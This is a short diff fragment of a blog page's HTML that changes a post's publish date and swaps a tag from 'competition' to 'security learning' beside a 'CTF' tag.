                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-06-15
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-06-19
                             </span>
                         <span class="publish-author">
                             
@@ -879,8 +931,8 @@
                         <span class="chip bg-color">CTF</span>
                     </a>
                     
-                    <a href="/tags/%E6%AF%94%E8%B5%9B/">
-                        <span class="chip bg-color">比赛</span>
+                    <a href="/tags/%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/">
+                        <span class="chip bg-color">安全学习</span>
                     </a>
                     
                 </div>
